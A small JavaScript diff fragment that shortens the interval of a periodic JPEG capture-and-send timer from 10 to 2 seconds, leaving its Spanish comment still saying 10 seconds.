@@ -266,7 +266,7 @@
             }
           });
         }, 'image/jpeg');
-      }, 10000); // Capturar y enviar cada 10 segundos
+      }, 2000); // Capturar y enviar cada 10 segundos
 
       // Detener la captura después de cierto tiempo (opcional)
       var stopCaptureTimeout = setTimeout(function () {
